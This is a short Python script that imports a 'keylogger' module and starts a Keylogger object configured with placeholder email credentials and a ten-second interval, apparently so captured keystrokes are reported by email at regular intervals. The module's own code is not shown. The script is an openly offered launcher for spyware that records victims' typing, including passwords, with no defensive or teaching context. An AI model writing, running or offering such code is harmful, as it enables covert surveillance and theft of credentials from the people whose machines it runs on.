import keylogger

email = "Test@gmail.com"
password = "Test123"
time_interval = 10

my_keylogger = keylogger.Keylogger(email, password, time_interval)
my_keylogger.start()